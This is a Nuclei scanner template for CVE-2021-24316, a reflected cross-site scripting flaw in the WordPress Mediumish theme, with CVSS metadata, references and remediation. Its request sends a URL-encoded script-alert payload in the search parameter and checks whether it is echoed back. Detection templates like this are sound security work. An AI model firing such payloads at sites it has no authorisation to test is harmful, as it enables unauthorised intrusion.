id: CVE-2021-24316

info:
  name: WordPress Mediumish Theme <=1.0.47 - Cross-Site Scripting
  author: 0x_Akoko
  severity: medium
  description: WordPress Mediumish theme 1.0.47 and prior contains an unauthenticated reflected cross-site scripting vulnerability. The 's' GET parameter is not properly sanitized by the search feature before it is output back on the page.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the victim's browser, potentially leading to session hijacking, defacement, or theft of sensitive information.
  remediation: |
    Update to the latest version of the WordPress Mediumish Theme plugin (1.0.47 or higher) to mitigate this vulnerability.
  reference:
    - https://wpscan.com/vulnerability/57e27de4-58f5-46aa-9b59-809705733b2e
    - https://m0ze.ru/vulnerability/%5B2021-03-14%5D-%5BWordPress%5D-%5BCWE-79%5D-Mediumish-WordPress-Theme-v1.0.47.txt
    - https://www.wowthemes.net/themes/mediumish-wordpress/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-24316
    - https://github.com/ZephrFish/AutoHoneyPoC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-24316
    cwe-id: CWE-79
    epss-score: 0.00317
    epss-percentile: 0.70371
    cpe: cpe:2.3:a:wowthemes:mediumish:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: wowthemes
    product: mediumish
    framework: wordpress
  tags: cve2021,cve,mediumish,xss,wordpress,wpscan,intrusive,wowthemes

http:
  - method: GET
    path:
      - "{{BaseURL}}/?post_type=post&s=%22%3E%3Cscript%3Ealert(/{{randstr}}/)%3C/script%3E "

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - <script>alert(/{{randstr}}/)</script>
          - Sorry, no posts matched your criteria.
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100c11061db9763dbe83443e5d5d9740c8f7102f72cc669c0921147a3b0b02ae9d9022100b43cd42f1fdc16d88e3f31c42598d6806a73dde0a2a41366a20401abbdf45f7a:922c64590222798bb761d5b6d8e72950